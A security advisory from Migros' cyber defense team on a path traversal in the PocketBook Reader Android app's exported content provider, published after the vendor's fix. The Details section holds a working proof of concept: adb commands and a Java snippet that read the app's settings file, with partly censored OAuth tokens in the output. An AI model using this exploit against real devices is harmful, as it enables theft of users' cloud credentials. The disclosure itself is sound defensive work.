# Migros Security Advisory
This is a security advisory published by the Security Operations / Cyber Defense Center team of MGB (Migros-Genossenschafts-Bund) found during penetration tests or red team engagements.

## PocketBook Reader Android App - Path Traversal to Arbitrary File Read and Credential Theft
| Key | Value |
| --- | --- |
| Vendor | PocketBook / Obreey Products |
| Product | PocketBook Reader (Android) |
| Vulnerability | Path Traversal to Arbitrary File Read and Credential Theft |
| Affected Versions | 5.65.0.39561.release (com.obreey.reader) |
| URL | [https://play.google.com/store/apps/details?id=com.obreey.reader](https://play.google.com/store/apps/details?id=com.obreey.reader) |
| CVSS 4.0 | 8.2 |
| CWE | CWE-22 |
| CAPEC | CWE-200 |
| MSEC ID | MSEC-2026-006 |
| Vendor ID | Pending |
| CVE ID | CVE-2026-119725 |

## Table of Contents
1. Summary
2. Details
3. Workaround and Fix
4. Credits
5. Timeline
6. References
7. About Us
8. Disclaimer

## 1. Summary
PocketBook Reader (com.obreey.reader) is a popular Android e-book reader application available on the Google Play Store. In version 5.65.0.39561 (confirmed through testing) and probably earlier, the application exports a ContentProvider ("CoverProvider") at the authority "<package>.appwidgets" with android:exported="true" and no permission restrictions. The CoverProvider's openFile() method reconstructs filesystem paths from URI path segments by replacing semicolons with forward slashes, without any path validation, canonicalization, or directory confinement. This allows any application installed on the same device - without requiring any special permissions - to read arbitrary files accessible to the PocketBook Reader process by crafting a content:// URI with path traversal components. Since the application holds broad storage permissions (MANAGE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE), the impact extends to files across the entire device storage. Most critically, this vulnerability allows extraction of the application's SharedPreferences file containing cloud service OAuth tokens (PocketBook Cloud, Google, Dropbox, bookstore accounts), OPDS catalog credentials, and user profile data. PocketBook Cloud tokens are encrypted with AES using a hardcoded key embedded in the application code, making them trivially decryptable.


## 2. Details
The CoverProvider class at com/obreey/appwidgets/CoverProvider.java is declared in the AndroidManifest.xml as:

```xml
<provider android:authorities="com.obreey.reader.appwidgets"
          android:exported="true"
          android:name="com.obreey.appwidgets.CoverProvider"
          android:process=":light"/>
```

No android:readPermission, android:writePermission, or android:permission attributes are set, meaning any app can interact with this provider.

The openFile() method (CoverProvider.java, lines 56-63) takes the third URI path segment, replaces all semicolons with forward slashes, and opens the resulting path:

```java
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    try {
        List<String> pathSegments = uri.getPathSegments();
        String filepath = pathSegments.get(2).replaceAll(";", "/");
        File f = new File(filepath);
        ParcelFileDescriptor pfd = ParcelFileDescriptor.open(f, 268435456);
        return pfd;
    } catch (Exception e) {
        e.printStackTrace();
        return super.openFile(uri, mode);
    }
}
```

The semicolon-to-slash replacement is the intended encoding scheme, as confirmed by the inverse function getUriForBookCover() which replaces slashes with semicolons to encode cover image paths into URIs. However, no validation is performed on the reconstructed path - there is no check for ".." traversal sequences, no canonical path verification, and no restriction to a specific directory.

Additionally, the same provider exposes:
- query(): Returns metadata from the book_covers SQLite table (titles, authors, file paths, reading progress) to any caller.
- call() with METHOD_READ/METHOD_WRITE: Allows reading and writing arbitrary SharedPreferences keys in the provider's preference file.

The application's SharedPreferences file "settings.xml" (accessible via the path traversal at /data/data/com.obreey.reader/shared_prefs/settings.xml) contains the key "pref_list_of_cloud_accounts" which stores a JSON array of cloud service account objects including OAuth access tokens and refresh tokens for PocketBook Cloud, Google, Dropbox, and bookstore accounts.

Exploitation requires only a malicious app installed on the same device. No special permissions are needed. The attack can also be performed via ADB for demonstration purposes.

To read /etc/hosts (baseline test confirming the traversal):
```
adb shell content read --uri "content://com.obreey.reader.appwidgets/cover/120-200/%3Betc%3Bhosts"
```

Output of the above command on a test device:
```
akita:/ $ content read --uri "content://com.obreey.reader.appwidgets/cover/120-200/%3Betc%3Bhosts"
127.0.0.1       localhost
::1             ip6-localhost
```

To read the SharedPreferences file containing OAuth tokens:
```
adb shell content read --uri "content://com.obreey.reader.appwidgets/cover/120-200/%3Bdata%3Bdata%3Bcom.obreey.reader%3Bshared_prefs%3Bsettings.xml"
```

Output of the above command on a test device:
```
akita:/ $ content read --uri "content://com.obreey.reader.appwidgets/cover/120-200/%3Bdata%3Bdata%3Bcom.obreey.reader%3Bshared_prefs%3Bsettings.xml"
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <long name="last_scan_start_time" value="1787329681249" />
    <string name="pref_list_of_cloud_accounts">[{&quot;provider_id&quot;:&quot;pocketbook_de&quot;,&quot;access_token&quot;:&quot;hCFVr3<CENSORED>7fig0FRA==\n&quot;,&quot;refresh_token&quot;:&quot;hCFVr3bt<CENSORED>lTKW\/jindx<CENSORED>ddUpjx9CkqwNRl\n&quot;,&quot;valid_to&quot;:1787509746,&quot;sac_access_token&quot;:&quot;nDJPILLK<CENSORED>pJlkKO5OL\n&quot;,&quot;sac_refresh_token&quot;:&quot;oOER7SGe+koS\/OWWk<CENSORED>JvnNKon\n&quot;,&quot;sac_valid_to&quot;:1789921756,&quot;api_url&quot;:&quot;https:\/\/pocketbook.de\/graphql&quot;,&quot;store_code&quot;:&quot;de_de&quot;,&quot;user_id&quot;:&quot;7861965&quot;,&quot;email&quot;:&quot;han<CENSORED>om.de&quot;,&quot;firstname&quot;:&quot;Hans&quot;,&quot;lastname&quot;:&quot;B<CENSORED>m&quot;,&quot;need_relogin&quot;:false,&quot;cloud&quot;:&quot;graphql_store&quot;,&quot;synchronize&quot;:false,&quot;auto_upload&quot;:false,&quot;wifi_only&quot;:false,&quot;show_in_all_books&quot;:true,&quot;sync_collections&quot;:true},{&quot;expires_in&quot;:1787336965,&quot;refresh_token&quot;:&quot;dTo0M<CENSORED>yNDU5NQ&quot;,&quot;access_token&quot;:&quot;dTo0MzQ<CENSORED>U3NA&quot;,&quot;login_name&quot;:&quot;ha<CENSORED>om.de&quot;,&quot;user_json&quot;:&quot;{\&quot;audio_books_size\&quot;:0,\&quot;books_size\&quot;:0,\&quot;email\&quot;:\&quot;ha<CENSORED>m.de\&quot;,\&quot;files_size\&quot;:0,\&quot;files_size_limit\&quot;:5368709120,\&quot;full_name\&quot;:\&quot;ha<CENSORED>m.de\&quot;,\&quot;internal_account\&quot;:{\&quot;email\&quot;:\&quot;user440<CENSORED>sync.com\&quot;,\&quot;is_main\&quot;:false,\&quot;password\&quot;:\&quot;\\u0013\\n \\u001c!\\u0010\\u0004$\&quot;,\&quot;vendor_id\&quot;:\&quot;pocketbook\&quot;},\&quot;login\&quot;:\&quot;ha<CENSORED>.de\&quot;,\&quot;provider_name\&quot;:\&quot;Pocketbook.de\&quot;,\&quot;register_date\&quot;:\&quot;2026-08-21T16:29:25Z\&quot;,\&quot;role\&quot;:\&quot;USER\&quot;,\&quot;shop\&quot;:{\&quot;home_url\&quot;:\&quot;https:\/\/pocketbook.de\&quot;,\&quot;icon\&quot;:\&quot;https:\/\/pocketbook.de\/static\/version1728478203\/webapi_rest\/_view\/de_DE\/images\/logo.svg\&quot;,\&quot;id\&quot;:\&quot;1\&quot;,\&quot;isbn_search_url\&quot;:\&quot;\&quot;,\&quot;name\&quot;:\&quot;Pocketbook.de\&quot;},\&quot;user_id\&quot;:\&quot;4<CENSORED>5\&quot;}&quot;,&quot;internal_email&quot;:&quot;user<CENSORED>nc.com&quot;,&quot;cloud&quot;:&quot;pb_cloud&quot;,&quot;synchronize&quot;:false,&quot;auto_upload&quot;:false,&quot;wifi_only&quot;:false,&quot;show_in_all_books&quot;:true,&quot;need_relogin&quot;:false,&quot;sync_collections&quot;:true}]</string>
    <string name="start.act">bookshelf</string>
    <string name="pref.scan.list">{&#10;  &quot;\/storage\/emulated\/0&quot;: &quot;SCAN&quot;,&#10;  &quot;\/storage\/emulated\/0\/PocketBook&quot;: &quot;BOOK&quot;&#10;}</string>
    <string name="start.uri">home</string>
    <string name="gui_theme">CTheme6</string>
    <string name="setting.bookstore.price_currency_code">EUR</string>
    <long name="last_autoscan_request_time" value="1787343527520" />
</map>
```

To read the app's global settings:
```
adb shell content read --uri "content://com.obreey.reader.appwidgets/cover/120-200/%3Bdata%3Bdata%3Bcom.obreey.reader%3Bshared_prefs%3Bsettings_global.xml"
```

Output of the above command on a test device:
```
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="new_policy_showed" value="true" />
    <boolean name="needMigrateFromMultiuser" value="false" />
    <string name="app_resources_name">5.65.0.39561.release</string>
    <boolean name="adept:user4407655.pbookde@pbsync.com@pocketbook" value="true" />
    <int name="app_resources_version" value="0" />
    <string name="GRAPH_GL_BASE_API_URL">https://pocketbook.de/graphql</string>
    <string name="states_event_update_version">5.65.0.39561.release</string>
    <boolean name="user_agreed_terms" value="true" />
    <boolean name="use_native_database_directory" value="true" />
    <int name="exp_audience" value="81" />
    <string name="GRAPH_GL_BASE_STORE_CODE">de_de</string>
    <string name="app_current_user_guid">84CEA7E8-63C6-4496-924A-9AA446F7DA58</string>
    <string name="app_sdcard_dir">/storage/emulated/0</string>
    <boolean name="permission_notification_requested" value="true" />
    <boolean name="permission_notification_shown_rationale" value="true" />
    <int name="net_time_dif" value="0" />
</map>
```

Note: Semicolons in the URI must be percent-encoded as %3B to prevent shell interpretation. Android's Uri.parse() decodes %3B back to ";" before getPathSegments() returns the segment, and the replaceAll(";", "/") then produces the intended file path.

From a malicious Android app (no permissions required):
```java
Uri uri = Uri.parse(
    "content://com.obreey.reader.appwidgets/cover/120-200/"
    + "/data/data/com.obreey.reader/shared_prefs/settings.xml".replace("/", ";")
);
InputStream is = getContentResolver().openInputStream(uri);
byte[] data = is.readAllBytes();
// data now contains the SharedPreferences XML with OAuth tokens
```


## 3. Workaround and Fix
The following chapter describes how the reported vulnerability can be mitigated (e.g., using a workaround) and if available sustainably fixed.
### Workaround
No workaround is available to end users. The vulnerability is in the application code and cannot be mitigated without an update from the vendor. Users should be aware that any application installed on the same device can read their cloud service credentials stored by PocketBook Reader.


### Fix
The vendor should apply the following fixes:
1. Set android:exported="false" on the CoverProvider, or add a signature-level permission (android:permission with protectionLevel="signature") if cross-app access is required for widgets.
2. In openFile(), validate the resolved filepath using File.getCanonicalPath() and verify it starts with an allowed base directory (e.g., the app's cover cache directory). Reject any path containing ".." components.
3. Remove the call() method's unrestricted SharedPreferences read/write capability, or restrict it to known safe keys.
4. Store OAuth tokens using Android's EncryptedSharedPreferences with keys backed by the Android Keystore, or directly in the Android Keystore, rather than using a hardcoded AES key.
5. Be aware that a hardcoded AES key provides no real security. Only a secure OS-provided key store provides proper security.



## 4. Credits
- Rafael Fedler, Migros-Genossenschafts-Bund (MGB)

## 5. Timeline
| Date | Process | Comments |
| --- | --- | --- |
| 12-08-2026 | Vulnerability Discovery | Vulnerability discovered during security review of PocketBook Reader Android application |
| 24-08-2026 | Vendor Notification | Contacted vendor via e-mail to inform of this vulnerability |
| 27-08-2026 | Vendor Receipt | Vendor confirmed they received the vulnerability report |
| 11-09-2026 | Vendor Validation | Vendor confirms they started working on a fix |
| 23-10-2026 | Vendor Validation | Migros asks when security patch to Android app can be expected |
| 23-10-2026 | Vendor Validation | Vendor promises patches to Android app within two weeks |
| 10-11-2026 | Vendor Validation | Migros contacts vendor again |
| 10-11-2026 | Vendor Validation | Vendor states update will be released in two days |
| 10-11-2026 | Vendor Resolution | Update released to Google Play Store |
| 13-11-2026 | Advisory Release | Advisory released by Migros to GitHub |

## 6. References
- [https://play.google.com/store/apps/details?id=com.obreey.reader](https://play.google.com/store/apps/details?id=com.obreey.reader)

## 7. About Us
The MGB (Migros-Genossenschafts-Bund) is the central service company of the Migros Group and offers around 350 different functions. For this reason, we are always on the lookout for specialists from a wide range of fields. You can find us on [jobs.migros.ch](https://migros-gruppe.jobs/de/unsere-unternehmen/migros-gruppe/offene-stellen?q=cyber).


## 8. Disclaimer
The MGB (Migros-Genossenschafts-Bund) works with suppliers to mitigate identified vulnerabilities as best as possible. The publication of vulnerabilities without the availability of a suitable corrective measure (patch) is not the goal of the MGB. The full disclosure of a vulnerability is only used by MGB in exceptional cases. The protection of the Migros community, especially those who are in a contractual relationship, must be guaranteed in any case and MGB will act in their interests.


